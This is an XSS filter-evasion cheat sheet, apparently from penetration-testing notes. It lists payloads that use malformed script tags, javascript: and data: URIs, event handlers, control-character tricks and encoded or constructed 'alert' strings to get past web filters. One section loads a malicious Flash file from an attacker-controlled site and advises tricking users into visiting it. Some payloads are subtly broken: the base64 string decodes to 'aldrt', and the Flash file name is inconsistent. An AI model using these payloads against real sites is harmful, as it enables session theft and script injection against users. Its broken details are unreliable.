# Filter Evasion

## Common Techniques

### Script tag

#### Weak tag parsing bypass

```
<ScRiPt>...</sCrIpT>
<ScRiPt>...    #unclosed tags
<script/[gibberish]>...<script>
<script [\n\r\t]>...</script>
<script [\x00 \x0D \x0A]>... </script [\x00 \x0D \x0A]>
<scr<script>ipt>...</scr<script>ipt>
```

#### Common alternative tags

Require use interaction

```
<a href="javascript:[code]">show</a>
<a href="data:text/html;base64,[base64 payload]">show</a>

<form action="javascript:[code]><button>Click me</button></form>
<form id="f1"></form><button form="x" formaction="javascript:[code]">Click me</button>

<object data="javascript:[code]">
<object data="text/html:<script>[code]</script>">
<object data="data:text/html;base64,[base64 payload]">
```

#### EvilCos

Can be downloaded from [here](https://github.com/evilcos/xss.swf).

Host the age on a site that you control and trick a user to navigate to it or trigger a HTTP request to the malicious URL.

```
<object data="[evil site]/xss.wfs">
<object data="[evil site]/xss.wfs" allowscriptaccess="always">
```

### Events

#### Common HTML 4

```
<body onload="[code]">
<input type="image" src="x" onerror="[code]">
<isindex onmouseover="[code]">
<form oninput="[code]"><input></form>
<textarea autofocu onfocus="[code]">
<input oncut="[code]">
```

#### Common HTML 5

```
<svg onload="[code]">
<keygen autofocus onfocus="[code]">
<video><source onerror="[code]">
<marquee onstart="[code]">
```

#### Filter Bypass

Bypass filter that match every word that starts with on by exploiting browser dynamisms

```
<svg/onload=...>
<svg///////onload=...>
<svg id="x";onload=...>
<svg id=x;onload=...>
<svg id=`x`onload=...>
```

Bypass filters by exploiting control characters not included in the /s regex selector

```
<svg onload%09=...>
<svg %09onload=...>
<svg %09onload%20=...>
<svg onload%09%20%28%2c%3b=...>
<svg onload%0b=...>
```

List of control characters commonly allowed after the equal sign or just before the event name to  use to spoof filters

```
%09 %0b %0c %20 %3b    #Internet Explorer
%09 %20 %28 %2c %3b    #Google Chrome
%2c %3b                #Safari
%09 %20 %28 %2c %3b    #Firefox
%09 %20 %2c %3b        #Opera
%09 %20 %28 %2c %3b    #Android
```

### Keywords

Some filters try to detect common words used in XSS attacks such as alert, document, xhr, cookie etc...

#### Bypass by encoding

URL encoding, Unicode and CSS formats can be used directly inside HTML pages without needing native tools. These techniques can be combined with each other to form even more complex payloads

```
alert
\u0061lert
&#x0061lert
&#97lert

#the encoding formats below require the input to be in a string
eval('\141lert')
eval('\x61lert')

#useless escapte characters
eval('\a\l\e\rt(\1\)')
```

#### Bypass by constructing strings

```
alert
/ale/.source+/rt/.source
String.fromCharCode(97,108,101,114,116)
atob("YWxkcnQ=")
17795081..toString(36)
```

